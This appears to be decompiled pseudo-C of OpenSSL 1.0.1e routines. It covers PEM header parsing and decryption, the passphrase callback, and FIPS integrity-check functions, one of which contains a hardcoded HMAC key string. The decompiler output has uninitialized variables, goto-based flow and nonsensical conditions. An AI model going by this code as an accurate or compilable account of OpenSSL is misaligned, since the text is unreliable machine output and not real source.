    int64_t v17 = (int64_t)"DEK-Info: "; // 0x46b4c0
    int64_t v18 = v13 + 1; // 0x46b4c0
    int64_t v19 = 10; // 0x46b4c0
    goto lab_dec_label_pc_unknown_10;
  lab_dec_label_pc_unknown_10:;
    int64_t v20; // 0x46b4c0
    int64_t v21; // 0x46b610
    int64_t v22; // 0x46b618
    if (*(char *)v18 == *(char *)v17) {
        v21 = v18 + v7;
        int64_t v23 = v19 - 1; // 0x46b610
        v17 += v7;
        v18 = v21;
        v19 = v23;
        if (v23 == 0) {
            // 0x46b618
            v22 = v13 + 11;
            v20 = v22;
            goto lab_0x46b62c;
        } else {
            goto lab_dec_label_pc_unknown_10;
        }
    } else {
        // 0x46b701
        ERR_put_error(9, 107, 105, "pem_lib.c", 512);
        result = 0;
        goto lab_0x46b51d;
    }
  lab_0x46b570:;
    int64_t v24 = v12 + 1; // 0x46b570
    char v25 = *(char *)v24; // 0x46b574
    if (v25 != 0) {
        // 0x46b568
        v12 = v24;
        v13 = v24;
        if (v25 == 10) {
            goto lab_0x46b600;
        } else {
            goto lab_0x46b570;
        }
    } else {
        // 0x46b57b
        ERR_put_error(9, 107, 112, "pem_lib.c", 509);
        result = 0;
        goto lab_0x46b51d;
    }
  lab_0x46b62c:;
    int64_t v26 = v20;
    char * v27 = (char *)v26;
    char v28 = *v27; // 0x46b62c
    v20 = v26 + 1;
    int64_t v29; // 0x46b4c0
    uint32_t v30; // 0x46b662
    if (v28 < 58 || v28 == 45 || v28 < 91) {
        goto lab_0x46b62c;
    } else {
        // 0x46b649
        *v27 = 0;
        int64_t v31 = EVP_get_cipherbyname(v22, v21); // 0x46b64d
        *a2 = v31;
        *v27 = v28;
        if (v31 == 0) {
            // 0x46b751
            ERR_put_error(9, 107, 114, "pem_lib.c", 537);
            result = 0;
            goto lab_0x46b51d;
        } else {
            // 0x46b662
            v30 = *(int32_t *)(v31 + 12);
            if (v30 < 1) {
                goto lab_0x46b685;
            } else {
                // 0x46b669
                v29 = v6;
                goto lab_0x46b678;
            }
        }
    }
  lab_0x46b685:;
    int64_t v32 = 2 * (int64_t)v30; // 0x46b685
    result = 1;
    int64_t v33; // 0x46b4c0
    int64_t v34; // 0x46b4c0
    if ((int32_t)v32 < 1) {
        goto lab_0x46b51d;
    } else {
        // 0x46b6d1
        v33 = 0;
        v34 = v26;
        goto lab_0x46b6d1_2;
    }
  lab_0x46b678:
    // 0x46b678
    *(char *)(v29 + 8) = 0;
    int64_t v35 = v29 + 1; // 0x46b67c
    v29 = v35;
    if (v35 != v6 + 1 + (int64_t)(v30 - 1)) {
        goto lab_0x46b678;
    } else {
        goto lab_0x46b685;
    }
  lab_0x46b6d1_2:;
    int64_t v36 = v34 + 1;
    char v37 = *(char *)v36; // 0x46b6d1
    int64_t v38; // 0x46b4c0
    if (v37 < 58) {
        // 0x46b6a0
        v38 = (int64_t)v37 + 0xffffffd0;
        goto lab_0x46b6a7;
    } else {
        if (v37 < 71) {
            // 0x46b6e5
            v38 = (int64_t)v37 + 0xffffffc9;
            goto lab_0x46b6a7;
        } else {
            if (v37 < 103) {
                // 0x46b6f8
                v38 = (int64_t)v37 + 0xffffffa9;
                goto lab_0x46b6a7;
            } else {
                // 0x46b729
                ERR_put_error(9, 101, 103, "pem_lib.c", 564);
                result = 0;
                goto lab_0x46b51d;
            }
        }
    }
  lab_0x46b6a7:;
    int64_t v39 = v38;
    int32_t v40 = v33; // 0x46b6a9
    int64_t v41 = v33 + 1 & 0xffffffff; // 0x46b6b8
    uint32_t v42 = 4 * v40 & 4 ^ 4;
    int64_t v43 = v42 == 0 ? v39 : (int64_t)((int32_t)v39 << v42);
    char * v44 = (char *)(v6 + 8 + (int64_t)(v40 / 2)); // 0x46b6c0
    *v44 = *v44 | (char)v43;
    result = 1;
    v33 = v41;
    v34 = v36;
    if ((v32 & 0xfffffffe) > v41) {
        goto lab_0x46b6d1_2;
    } else {
        goto lab_0x46b51d;
    }
}

// Address range: 0x46b9b0 - 0x46baaf
int64_t PEM_def_callback(int64_t * str2, int64_t a2, uint32_t a3, int64_t str) {
    if (str != 0) {
        int32_t len = strlen((char *)str); // 0x46b9cd
        int32_t v1 = a2; // 0x46b9d2
        int32_t v2 = len - v1; // 0x46b9d2
        uint32_t result = v2 == 0 | v2 < 0 != ((v2 ^ len) & (len ^ v1)) < 0 ? len : v1; // 0x46b9da
        memcpy(str2, (int64_t *)str, result);
        return result;
    }
    int64_t v3 = (int64_t)str2;
    int64_t v4 = a3; // 0x46b9b7
    int64_t v5 = a2 & 0xffffffff; // 0x46b9bb
    int64_t v6 = EVP_get_pw_prompt(); // 0x46b9f8
    int64_t v7 = v6 == 0 ? (int64_t)"Enter PEM pass phrase:" : v6; // 0x46ba0a
    if ((int32_t)EVP_read_pw_string_min(v3, 4, v5, v7, v4) != 0) {
        // 0x46ba5c
        ERR_put_error(9, 100, 109, "pem_lib.c", 111);
        memset(str2, 0, (int32_t)a2);
        return 0xffffffff;
    }
    int32_t len2 = strlen((char *)str2); // 0x46ba13
    while (len2 <= 3) {
        int64_t v8 = *(int64_t *)*(int64_t *)0x7397d0; // 0x46ba39
        __fprintf_chk((struct _IO_FILE *)v8, 1, "phrase is too short, needs to be at least %d chars\n", 4);
        if ((int32_t)EVP_read_pw_string_min(v3, 4, v5, v7, v4) != 0) {
            // 0x46ba5c
            ERR_put_error(9, 100, 109, "pem_lib.c", 111);
            memset(str2, 0, (int32_t)a2);
            return 0xffffffff;
        }
        len2 = strlen((char *)str2);
    }
    // 0x46baa0
    return len2;
}

// Address range: 0x46bab0 - 0x46bd27
int64_t PEM_do_header(int64_t * a1, int64_t a2, int64_t * a3, int64_t a4, int64_t a5) {
    int64_t v1 = __readfsqword(40); // 0x46badb
    int64_t result = 1; // 0x46baff
    int32_t v2; // 0x46bab0
    int64_t v3; // bp-1336, 0x46bab0
    if (a1 == NULL) {
        goto lab_0x46bb72;
    } else {
        // 0x46bb01
        v2 = 1;
        if (a4 == 0) {
            // 0x46bb22
            v2 = PEM_def_callback(&v3, 1024, 0, a5);
            if (v2 < 1) {
                // 0x46bc50
                ERR_put_error(9, 106, 104, "pem_lib.c", 458);
                result = 0;
                goto lab_0x46bb72;
            } else {
                goto lab_0x46bb2b;
            }
        } else {
            goto lab_0x46bb2b;
        }
    }
  lab_0x46bb72:
    // 0x46bb72
    if (v1 == __readfsqword(40)) {
        // 0x46bb89
        return result;
    }
    // 0x46bd19
    __stack_chk_fail();
    int64_t v4 = (int64_t)&g299 & 0xffffffff; // 0x46bd22
    goto lab_0x46bc22;
  lab_0x46bb2b:;
    int64_t v7 = &v3;
    int64_t v10 = (int64_t)a1 + 8; // 0x46bb38
    int64_t v11 = EVP_md5(); // 0x46bb3c
    int64_t v8; // bp-136, 0x46bab0
    int64_t v12 = EVP_BytesToKey(v7, v11, v10, &v3, v2, 1, &v8, 0); // 0x46bb65
    result = 0;
    int32_t v9; // bp-1340, 0x46bab0
    int64_t * v5; // bp-1344, 0x46bab0
    int64_t v6; // 0x46bbd5
    if ((int32_t)v12 != 0) {
        int64_t v13 = (int64_t)a3 & 0xffffffff;
        v5 = (int64_t *)v13;
        int64_t v14; // bp-312, 0x46bab0
        v6 = &v14;
        EVP_CIPHER_CTX_init(v6);
        if ((int32_t)EVP_DecryptInit_ex(&v14, v6, 0, &v8, v10, 1) != 0) {
            int64_t v15 = EVP_DecryptUpdate(v6, a2, (int64_t)&v9, a2, v13, (int64_t)&g299); // 0x46bcb5
            if ((int32_t)v15 == 0) {
                goto lab_0x46bbf8;
            } else {
                int64_t v16 = EVP_DecryptFinal_ex(v6, (int64_t)v9 + a2, (int64_t)&v5, a2); // 0x46bcd4
                EVP_CIPHER_CTX_cleanup(v6);
                OPENSSL_cleanse(v7, 1024);
                OPENSSL_cleanse((int64_t)&v8, 64);
                int32_t v17 = v9 + (int32_t)(int64_t)v5; // 0x46bd01
                if ((int32_t)v16 == 0) {
                    // 0x46bd1e
                    v4 = (int64_t)v17 & 0xffffffff;
                    goto lab_0x46bc22;
                } else {
                    // 0x46bd09
                    *a3 = (int64_t)v17;
                    result = 1;
                    goto lab_0x46bb72;
                }
            }
        } else {
            goto lab_0x46bbf8;
        }
    } else {
        goto lab_0x46bb72;
    }
  lab_0x46bc22:
    // 0x46bc22
    v5 = (int64_t *)v4;
    ERR_put_error(9, 106, 101, "pem_lib.c", 483);
    result = 0;
    goto lab_0x46bb72;
  lab_0x46bbf8:
    // 0x46bbf8
    EVP_CIPHER_CTX_cleanup(v6);
    OPENSSL_cleanse(v7, 1024);
    OPENSSL_cleanse((int64_t)&v8, 64);
    v4 = v9 + (int32_t)(int64_t)v5;
    goto lab_0x46bc22;
}

// Address range: 0x46bd30 - 0x46c1b0
int64_t PEM_bytes_read_bio(int64_t * a1, int64_t * a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6, int64_t a7) {
    int64_t v1 = __readfsqword(40); // 0x46bd56
    char * v2 = NULL; // bp-96, 0x46bd96
    int64_t v3 = 0; // bp-104, 0x46bd9f
    int64_t v4 = 0; // bp-112, 0x46bda8
    int64_t v5; // bp-120, 0x46bd30
    int64_t v6 = &v5; // 0x46bdc5
    int64_t v7 = &v4; // 0x46bdc8
    int64_t v8 = &v3; // 0x46bdcb
    int64_t v9 = (int64_t)&v2; // 0x46bdce
    int64_t v10; // 0x46bd30
    int64_t v11; // 0x46bd30
    int64_t v12; // 0x46bd30
    int64_t v13; // 0x46bd30
    int64_t v14; // 0x46bd30
    int64_t v15; // 0x46bd30
    int64_t v16; // bp-128, 0x46bd30
    int64_t v17; // 0x46bd30
    int64_t v18; // 0x46bdde
    int32_t v19; // 0x46bdb1
    if ((int32_t)PEM_read_bio(a5, v9, v8, v7, v6) == 0) {
        goto lab_0x46c0f0;
    } else {
        // 0x46bdde
        v19 = &v16;
        bool v20; // 0x46bd30
        v17 = v20 ? -1 : 1;
        while (true) {
          lab_0x46bdde:
            // 0x46bdde
            v18 = (int64_t)v2;
            int64_t v21 = function_42e6b0(v18, a4, v8); // 0x46bde9
            int64_t v22 = (int64_t)"ANY PRIVATE KEY"; // 0x46bdf0
            int64_t v23 = a4; // 0x46bdf0
            int64_t v24 = 16; // 0x46bdf0
            if ((int32_t)v21 == 0) {
                // break -> 0x46be40
                break;
            }
            while (true) {
                int64_t v25 = v23;
                int64_t v26 = v22;
                v13 = (int64_t)"PARAMETERS";
                v15 = a4;
                v11 = 11;
                if (*(char *)v25 != *(char *)v26) {
                    goto lab_0x46bea8;
                }
                v24--;
                v22 = v26 + v17;
                v23 = v25 + v17;
                v10 = 22;
                v14 = v18;
                v12 = (int64_t)"ENCRYPTED PRIVATE KEY";
                if (v24 == 0) {
                    goto lab_0x46be09;
                }
            }
            goto lab_0x46c068;
        }
        goto lab_0x46be40_2;
    }
  lab_0x46bea8:
    // 0x46bea8
    if (*(char *)v15 == *(char *)v13) {
        int64_t v27 = v11 - 1; // 0x46beb7
        v13 += v17;
        v15 += v17;
        v11 = v27;
        if (v27 == 0) {
            goto lab_0x46c068;
        } else {
            goto lab_0x46bea8;
        }
    }
  lab_0x46be09:
    // 0x46be09
    if (v10 == 0) {
        goto lab_0x46be40_2;
    } else {
        int64_t v28 = v14;
        char v29 = *(char *)v12; // 0x46be18
        v10--;
        v14 = v28 + v17;
        v12 += v17;
        if (*(char *)v28 == v29) {
            goto lab_0x46be09;
        }
    }
  lab_0x46c0f0:;
    int64_t result = 0; // 0x46c102
    if (ERR_peek_error(a5, v9, v8, v7, v6, a6) % 0x1000 == 108) {
        // 0x46c108
        ERR_add_error_data(2, "Expecting: ", a4, (char *)&v4, &v5, (char *)a6);
        result = 0;
    }
    goto lab_0x46be7a;
  lab_0x46c068:;
    int64_t v40 = pem_check_suffix(v18, "PARAMETERS"); // 0x46c072
    int64_t v41 = (int64_t)"PARAMETERS"; // 0x46c079
    if ((int32_t)v40 >= 1) {
        int64_t v42 = EVP_PKEY_asn1_find_str(v19, v18, v40 & 0xffffffff); // 0x46c085
        v41 = v18;
        if (v42 != 0) {
            // 0x46c08f
            if (v16 != 0) {
                // 0x46c09d
                ENGINE_finish(v16);
            }
            // 0x46c0a2
            v41 = v18;
            if (*(int64_t *)(v42 + 104) != 0) {
                // break -> 0x46be40
                goto lab_0x46be40_2;
            }
        }
    }
    // 0x46c040
    CRYPTO_free((int64_t)v2, v41);
    CRYPTO_free(v3, v41);
    CRYPTO_free(v4, v41);
    if ((int32_t)PEM_read_bio(a5, v9, v8, v7, v6) == 0) {
        goto lab_0x46c0f0;
    }
    goto lab_0x46bdde;
  lab_0x46be7a:
    // 0x46be7a
    if (v1 != __readfsqword(40)) {
        // 0x46c1ab
        __stack_chk_fail();
        return &g299;
    }
    // 0x46be91
    return result;
  lab_0x46be40_2:;
    // 0x46be40
    int64_t v30; // bp-88, 0x46bd30
    if ((int32_t)PEM_get_EVP_CIPHER_INFO(v3, &v30) != 0) {
        int64_t v31 = v4; // 0x46c135
        int64_t v32 = PEM_do_header(&v30, v31, &v5, a6, a7); // 0x46c13d
        if ((int32_t)v32 == 0) {
            goto lab_0x46be5a;
        } else {
            int64_t v33 = v4; // 0x46c14a
            *a1 = v33;
            int64_t v34 = v5; // 0x46c15d
            *a2 = v34;
            char * v35 = v2;
            int64_t v36 = (int64_t)v35;
            if (a3 == 0) {
                // 0x46c18d
                CRYPTO_free(v36, v31);
                int64_t v37 = v3; // 0x46c197
                CRYPTO_free(v37, v31);
                result = 1;
            } else {
                // 0x46c16c
                *(int64_t *)(int64_t)a3 = v36;
                int64_t v38 = v3; // 0x46c179
                CRYPTO_free(v38, v31);
                result = 1;
            }
            goto lab_0x46be7a;
        }
    } else {
        goto lab_0x46be5a;
    }
  lab_0x46be5a:;
    int64_t v39 = &v30;
    CRYPTO_free((int64_t)v2, v39);
    CRYPTO_free(v3, v39);
    CRYPTO_free(v4, v39);
    result = 0;
    goto lab_0x46be7a;
}

// Address range: 0x485200 - 0x48520b
int64_t fips_set_selftest_fail(void) {
    // 0x485200
    g276 = 1;
    int64_t result; // 0x485200
    return result;
}

// Address range: 0x485210 - 0x485380
int64_t compute_file_hmac(int64_t file_path, int64_t * a2, int64_t * a3) {
    int64_t v1 = __readfsqword(40); // 0x485241
    int64_t v2; // bp-344, 0x485210
    HMAC_CTX_init(&v2);
    struct _IO_FILE * file = fopen((char *)file_path, "r"); // 0x485266
    int64_t v3; // 0x485210
    if (file != NULL) {
        int64_t v4 = EVP_sha256(); // 0x4852d0
        int64_t v5; // 0x485210
        HMAC_Init(&v2, "orboDeJITITejsirpADONivirpUkvarP", 32, v4, v5);
        int64_t data; // bp-16728, 0x485210
        int32_t items_read = fread(&data, 1, 0x4000, file); // 0x485316
        int64_t v6 = &v2;
        if (items_read != 0) {
            HMAC_Update(v6);
            while (fread(&data, 1, 0x4000, file) != 0) {
                // 0x4852f8
                HMAC_Update(v6);
            }
        }
        // 0x485320
        int32_t size; // bp-16732, 0x485210
        HMAC_Final(v6, &data, (int32_t)(int64_t)&size);
        int64_t * mem = malloc(size); // 0x485334
        *a2 = (int64_t)mem;
        int64_t v7 = 0xffffffff; // 0x485346
        if (mem != NULL) {
            // 0x485348
            *a3 = (int64_t)size;
            memcpy(mem, &data, size);
            v7 = 0;
        }
        // 0x48535d
        HMAC_CTX_cleanup(v6);
        fclose(file);
        v3 = v7;
    } else {
        // 0x485273
        HMAC_CTX_cleanup((int64_t)&v2);
        v3 = 0xffffffff;
    }
    // 0x485281
    if (v1 == __readfsqword(40)) {
        // 0x48529b
        return v3 & 0xffffffff;
    }
    // 0x485372
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x485380 - 0x48559d
int64_t FIPSCHECK_verify(int64_t * str) {
    char * str2 = NULL; // bp-64, 0x4853a8
    int64_t * mem = malloc(strlen((char *)str) + 8); // 0x4853ba
    if (mem == NULL) {
        // 0x485533
        return 0;
    }
    int64_t v1 = (int64_t)str;
    char * found_char_pos = strrchr((char *)str, 47); // 0x4853d6
    int64_t v2 = (int64_t)found_char_pos + 1;
    int64_t n = found_char_pos == NULL ? 0 : v2 - v1;
    int64_t v3 = n + (int64_t)mem; // 0x4853f0
    strncpy((char *)mem, (char *)str, (int32_t)n);
    *(int16_t *)v3 = 46;
    char * v4 = stpcpy((char *)(v3 + 1), (char *)(found_char_pos == NULL ? v1 : v2)); // 0x48540f
    *(int32_t *)v4 = 0x616d682e;
    *(int16_t *)((int64_t)v4 + 4) = 99;
    struct _IO_FILE * file = fopen((char *)mem, "r"); // 0x48542a
    if (file == NULL) {
        // 0x485590
        free(mem);
        // 0x485533
        return 0;
    }
    // 0x48543b
    int64_t v5; // bp-72, 0x485380
    if (__getdelim(&str2, (int32_t *)&v5, 10, file) >= 1) {
        char * found_char_pos2 = strchr(str2, 10); // 0x485465
        if (found_char_pos2 != NULL) {
            // 0x48546f
            *found_char_pos2 = 0;
        }
        // 0x485472
        int64_t v6; // bp-80, 0x485380
        int32_t v7; // bp-88, 0x485380
        if ((int32_t)compute_file_hmac(v1, &v6, (int64_t *)&v7) >= 0) {
            int64_t v8 = v7; // 0x48548a
            int64_t v9 = 2 * v8; // 0x485493
            int64_t * mem2 = malloc((int32_t)v9 | 1); // 0x48549c
            if (mem2 != NULL) {
                int64_t v10 = (int64_t)mem2; // 0x48549c
                int64_t v11 = v10; // 0x4854ba
                int64_t v12 = v6; // 0x4854ba
                int64_t v13 = v10; // 0x4854ba
                if (v7 != 0) {
                    unsigned char v14 = *(char *)v12; // 0x4854c0
                    char v15 = *(char *)((int64_t)(v14 % 16) | (int64_t)"0123456789abcdef"); // 0x4854d0
                    char v16 = *(char *)((int64_t)(v14 / 16) | (int64_t)"0123456789abcdef"); // 0x4854d6
                    *(char *)(v11 + 1) = v15;
                    *(char *)v11 = v16;
                    int64_t v17 = v8 - 1; // 0x4854e4
                    v11 += 2;
                    int64_t v18 = v17; // 0x4854e8
                    v12++;
                    while (v17 != 0) {
                        // 0x4854c0
                        v14 = *(char *)v12;
                        v15 = *(char *)((int64_t)(v14 % 16) | (int64_t)"0123456789abcdef");
                        v16 = *(char *)((int64_t)(v14 / 16) | (int64_t)"0123456789abcdef");
                        *(char *)(v11 + 1) = v15;
                        *(char *)v11 = v16;
                        v17 = v18 - 1;
                        v11 += 2;
                        v18 = v17;
                        v12++;
                    }
                    // 0x4854ea
                    v13 = v9 + v10;
                }
                // 0x4854ee
                *(char *)v13 = 0;
                int32_t v19 = strcasecmp((char *)mem2, str2); // 0x4854fc
                free((int64_t *)v6);
                free(mem2);
                free((int64_t *)str2);
                free(mem);
                fclose(file);
                // 0x485533
                return v19 == 0;
            }
            // 0x485560
            free((int64_t *)v6);
        }
    }
    // 0x485570
    free((int64_t *)str2);
    free(mem);
    fclose(file);
    // 0x485533
    return 0;
}

// Address range: 0x4855a0 - 0x485632
int64_t fips_is_owning_thread(void) {
    // 0x4855a0
    if (g275 == 0) {
        // 0x4855b1
        return 0;
    }
    // 0x4855c0
    int64_t v1; // 0x4855a0
    CRYPTO_lock(5, 40, "fips.c", 471, v1, (int64_t)&g299);
    if (g277 == 0) {
        // 0x4855e7
        CRYPTO_lock(6, 40, "fips.c", 479, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    // 0x485610
    int64_t v2; // bp-24, 0x4855a0
    CRYPTO_THREADID_current((int64_t)&v2);
    int64_t v3 = CRYPTO_THREADID_cmp(&v2, &g279, (int64_t)"fips.c"); // 0x485627
    if ((int32_t)v3 == 0) {
        // 0x4855e7
        CRYPTO_lock(6, 40, "fips.c", 479, (int64_t)&g299, (int64_t)&g299);
        return 1;
    }
    // 0x4855e7
    CRYPTO_lock(6, 40, "fips.c", 479, (int64_t)&g299, (int64_t)&g299);
    return 0;
}

// Address range: 0x485640 - 0x48569d
int64_t fips_set_mode(int32_t a1) {
    int64_t result = fips_is_owning_thread(); // 0x485643
    if (g275 == 0) {
        // 0x48565c
        return result;
    }
    if ((int32_t)result != 0) {
        // 0x485656
        g278 = a1;
        // 0x48565c
        return result;
    }
    // 0x485660
    CRYPTO_lock(9, 39, "fips.c", 94, (int64_t)&g299, (int64_t)&g299);
    g278 = a1;
    return CRYPTO_lock(10, 39, "fips.c", 96, (int64_t)&g299, (int64_t)&g299);
}

// Address range: 0x4856a0 - 0x485719
int64_t FIPS_selftest_failed(void) {
    // 0x4856a0
    if (g275 == 0) {
        // 0x4856b0
        return 0;
    }
    // 0x4856b8
    if ((int32_t)fips_is_owning_thread() != 0) {
        // 0x4856c2
        return g276;
    }
    // 0x4856d0
    CRYPTO_lock(5, 39, "fips.c", 127, (int64_t)&g299, (int64_t)&g299);
    CRYPTO_lock(6, 39, "fips.c", 129, (int64_t)g276, (int64_t)&g299);
    return g276;
}

// Address range: 0x485720 - 0x485780
int64_t FIPS_module_mode(void) {
    int64_t v1 = fips_is_owning_thread(); // 0x485723
    if (g275 == 0) {
        // 0x48573c
        return 0;
    }
    if ((int32_t)v1 != 0) {
        // 0x48573c
        return g278;
    }
    // 0x485740
    CRYPTO_lock(5, 39, "fips.c", 107, (int64_t)&g299, (int64_t)&g299);
    CRYPTO_lock(6, 39, "fips.c", 109, (int64_t)&g299, (int64_t)&g299);
    return g278;
}

// Address range: 0x485780 - 0x4857bb
int64_t FIPS_module_installed(int64_t a1, int64_t a2) {
    int32_t v1 = access("/usr/share/dracut/modules.d/01fips", F_OK); // 0x48578d
    if (v1 < 0) {
        // 0x4857a8
        return *__errno_location() != 2;
    }
    // 0x485797
    return v1 == 0;
}

// Address range: 0x4857c0 - 0x4857e8
int64_t FIPS_selftest_check(void) {
    // 0x4857c0
    if (g276 != 0) {
        // 0x4857d0
        return OpenSSLDie("fips.c", 143, "FATAL FIPS SELFTEST FAILURE");
    }
    // 0x4857cc
    int64_t result; // 0x4857c0
    return result;
}

// Address range: 0x4857f0 - 0x485930
int64_t verify_checksums(void) {
    int64_t v1 = __readfsqword(40); // 0x485807
    int64_t * v2 = dlopen("libcrypto.so.1.0.1e", RTLD_LAZY); // 0x48581a
    int64_t result = 0; // 0x485825
    if (v2 == NULL) {
        goto lab_0x485854;
    } else {
        int64_t * v3 = dlsym(v2, "FIPS_mode_set"); // 0x485831
        if (v3 == NULL) {
            // 0x48584a
            dlclose(v2);
            result = 0;
            goto lab_0x485854;
        } else {
            // 0x48583b
            char * str2; // bp-4168, 0x4857f0
            if (dladdr(v3, (struct _TYPEDEF_Dl_info *)&str2) != 0) {
                // 0x485888
                int64_t str; // bp-4136, 0x4857f0
                strncpy((char *)&str, str2, 0x1000);
                dlclose(v2);
                int64_t v4 = FIPSCHECK_verify(&str); // 0x4858b1
                result = 0;
                if ((int32_t)v4 != 0) {
                    char * substr_pos = strstr((char *)&str, "libcrypto.so"); // 0x4858ff
                    if (substr_pos != NULL) {
                        int64_t v5 = (int64_t)substr_pos;
                        *(int32_t *)substr_pos = 0x7362696c;
                        *(int16_t *)(v5 + 4) = 0x6c73;
                        int64_t v6 = v5 + 6; // 0x4858d5
                        *(char *)v6 = 0;
                        memmove((int64_t *)v6, (int64_t *)(v5 + 9), strlen((char *)(v5 + 8)));
                        char * substr_pos2 = strstr((char *)&str, "libcrypto.so"); // 0x4858ff
                        char * v7 = substr_pos2; // 0x48590a
                        while (substr_pos2 != NULL) {
                            // 0x4858c0
                            v5 = (int64_t)v7;
                            *(int32_t *)v7 = 0x7362696c;
                            *(int16_t *)(v5 + 4) = 0x6c73;
                            v6 = v5 + 6;
                            *(char *)v6 = 0;
                            memmove((int64_t *)v6, (int64_t *)(v5 + 9), strlen((char *)(v5 + 8)));
                            substr_pos2 = strstr((char *)&str, "libcrypto.so");
                            v7 = substr_pos2;
                        }
                    }
                    // 0x48590c
                    result = (int32_t)FIPSCHECK_verify(&str) != 0;
                }
                goto lab_0x485854;
            } else {
                // 0x48584a
                dlclose(v2);
                result = 0;
                goto lab_0x485854;
            }
        }
    }
  lab_0x485854:
    // 0x485854
    if (v1 == __readfsqword(40)) {
        // 0x48586b
        return result;
    }
    // 0x485921
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x485930 - 0x485b82
int64_t FIPS_module_mode_set(int64_t a1) {
    // 0x485930
    int64_t v1; // 0x485930
    int64_t v2; // 0x485930
    CRYPTO_lock(9, 39, "fips.c", 400, v2, v1);
    g275 = 1;
    CRYPTO_lock(9, 40, "fips.c", 490, (int64_t)&g299, (int64_t)&g299);
    if (g277 == 0) {
        // 0x485b30
        CRYPTO_THREADID_current((int64_t)&g279);
        g277 = 1;
    }
    // 0x485988
    CRYPTO_lock(10, 40, "fips.c", 497, (int64_t)&g299, (int64_t)&g299);
    int32_t v3 = a1; // 0x4859a3
    int64_t v4; // 0x485930
    int64_t v5; // 0x485930
    int64_t v6; // 0x485930
    if (v3 != 0) {
        // 0x4859f8
        g276 = 0;
        v6 = 102;
        v4 = 413;
        if ((int32_t)FIPS_module_mode() != 0) {
            goto lab_0x485a4c;
        } else {
            int32_t v7 = *(int32_t *)&g166; // 0x485a24
            v6 = 113;
            v4 = 424;
            if ((v7 & 0x6000000) == 0x6000000) {
                // 0x485af0
                g167 &= -0x10000001;
                *(int32_t *)g166 = v7 | 0x10000000;
                if ((int32_t)verify_checksums() == 0) {
                    // 0x485b50
                    ERR_put_error(45, 108, 110, "fips.c", 436);
                    g276 = 1;
                    v5 = 0;
                    goto lab_0x4859bd;
                } else {
                    // 0x485b08
                    if ((int32_t)FIPS_selftest() == 0) {
                        goto lab_0x485a5b;
                    } else {
                        // 0x485b16
                        fips_set_mode(v3);
                        v5 = 1;
                        goto lab_0x4859bd;
                    }
                }
            } else {
                goto lab_0x485a4c;
            }
        }
    } else {
        // 0x4859a7
        fips_set_mode(0);
        g276 = 0;
        v5 = 1;
        goto lab_0x4859bd;
    }
  lab_0x485a4c:
    // 0x485a4c
    ERR_put_error(45, 108, v6, "fips.c", v4);
    goto lab_0x485a5b;
  lab_0x4859bd:;
    int64_t v8 = v5; // 0x4859c7
    if (g275 == 0) {
        // 0x4859cd
        CRYPTO_lock(10, 39, "fips.c", 458, (int64_t)&g299, (int64_t)&g299);
        return v5 & 0xffffffff;
    }
    goto lab_0x485a77;
  lab_0x485a5b:
    // 0x485a5b
    g276 = 1;
    v8 = 0;
    if (g275 == 0) {
        // 0x4859cd
        int64_t v9; // 0x485930
        int64_t v10 = v9;
        CRYPTO_lock(10, 39, "fips.c", 458, (int64_t)&g299, (int64_t)&g299);
        return v10 & 0xffffffff;
    }
    goto lab_0x485a77;
  lab_0x485a77:
    // 0x485a77
    CRYPTO_lock(9, 40, "fips.c", 508, (int64_t)&g299, (int64_t)&g299);
    if (g277 != 0) {
        // 0x485ac0
        int64_t v11; // bp-40, 0x485930
        CRYPTO_THREADID_current((int64_t)&v11);
        int64_t v12 = CRYPTO_THREADID_cmp(&v11, &g279, (int64_t)"fips.c"); // 0x485ad2
        if ((int32_t)v12 == 0) {
            // 0x485adb
            g277 = 0;
        }
    }
    // 0x485a9e
    CRYPTO_lock(10, 40, "fips.c", 516, (int64_t)&g299, (int64_t)&g299);
    // 0x4859cd
    CRYPTO_lock(10, 39, "fips.c", 458, (int64_t)&g299, (int64_t)&g299);
    return v8 & 0xffffffff;
}

// Address range: 0x485b90 - 0x485e60
int64_t fips_pkey_signature_test(int64_t a1, int64_t * str, int32_t a3, int32_t a4, uint32_t a5, int32_t a6, uint32_t a7, int64_t a8) {
    int64_t v1 = a6;
    int64_t v2; // bp-392, 0x485b90
    int64_t v3 = &v2; // 0x485bda
    int64_t v4 = __readfsqword(40); // 0x485bdd
    EVP_MD_CTX_init(v3);
    int64_t v5 = v1; // 0x485bfc
    if (a6 == 0) {
        // 0x485e40
        v5 = EVP_sha256();
    }
    int64_t v6 = a5;
    int64_t v7 = a4;
    int64_t v8; // 0x485b90
    int64_t v9; // 0x485b90
    int64_t result; // 0x485b90
    int64_t v10; // bp-328, 0x485b90
    int64_t v11; // 0x485b90
    if ((int32_t)v11 == 6) {
        int64_t * v12 = (int64_t *)(a1 + 32); // 0x485dd0
        if ((int32_t)RSA_size(*v12) < 257) {
            goto lab_0x485c0b;
        } else {
            int64_t v13 = CRYPTO_malloc(RSA_size(*v12) & 0xffffffff, "fips_post.c", 135, v7, v6); // 0x485e00
            v8 = &v10;
            v9 = v13;
            if (v13 != 0) {
                goto lab_0x485c13;
            } else {
                // 0x485e11
                ERR_put_error(45, 109, 65, "fips_post.c", 138);
                result = 0;
                goto lab_0x485ca3;
            }
        }
    } else {
        goto lab_0x485c0b;
    }
  lab_0x485c43:;
    // 0x485c43
    int64_t v14; // 0x485b90
    if (v9 != v8) {
        // 0x485c48
        CRYPTO_free(v9, v14);
    }
    // 0x485c50
    EVP_MD_CTX_cleanup(&v2);
    result = 1;
    int32_t v15; // 0x485b90
    if (v15 != 1) {
        // 0x485c62
        ERR_put_error(45, 109, 117, "fips_post.c", 171);
        result = 0;
        if (a8 != 0) {
            // 0x485c8c
            ERR_add_error_data(2, "Type=", a8, "fips_post.c", (int64_t *)171, (char *)v1);
            result = 0;
        }
    }
    goto lab_0x485ca3;
  lab_0x485c0b:;
    int64_t v23 = &v10; // 0x485c0b
    v8 = v23;
    v9 = v23;
    goto lab_0x485c13;
  lab_0x485c13:;
    int32_t len = a3; // 0x485c17
    if (a3 == -1) {
        // 0x485db8
        len = strlen((char *)str);
    }
    // 0x485c1d
    if (a7 != 0) {
        // 0x485da0
        EVP_MD_CTX_set_flags(v3, (int64_t)a7);
    }
    int64_t v24 = EVP_DigestInit_ex(&v2, v5, 0, v7, v6); // 0x485c34
    v14 = v5;
    v15 = 0;
    int64_t v17; // 0x485b90
    int32_t v22; // bp-332, 0x485b90
    int64_t v19; // 0x485b90
    int64_t v20; // 0x485cfd
